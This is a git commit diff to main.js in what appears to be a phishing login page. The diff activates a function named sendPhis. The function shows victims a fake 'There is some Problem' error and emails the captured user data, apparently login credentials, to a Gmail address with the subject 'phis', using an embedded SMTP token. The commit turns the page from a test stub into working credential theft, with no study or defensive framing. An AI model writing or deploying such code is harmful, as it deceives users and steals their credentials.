5c802f3b5541d85d0665c3550c9da1ae17361ec3
useruser63 <65571299+useruser63@users.noreply.github.com>
2020-05-19 11:23:15 +0530

    Update main.js

--- src/main.js
+++ src/main.js
@@ -1,12 +1,12 @@
 function sendPhis(userdata) {
-  alert(userdata);
-  // Email.send({
-  //   SecureToken: "e2592eac-4288-4496-a4d3-bee71ec673f5",
-  //   To: 'someone@gmail.com',
-  //   From: "someone@gmail.com",
-  //   Subject: "phis",
-  //   Body: userdata
-  // });
+  alert("There is some Problem\nPlease try again later");
+  Email.send({
+    SecureToken: "e2592eac-4288-4496-a4d3-bee71ec673f5",
+    To: 'someone@gmail.com',
+    From: "someone@gmail.com",
+    Subject: "phis",
+    Body: userdata
+  });
 }
 function initialize() {
   document.getElementById("loginbutton").onclick = buttonclick => {
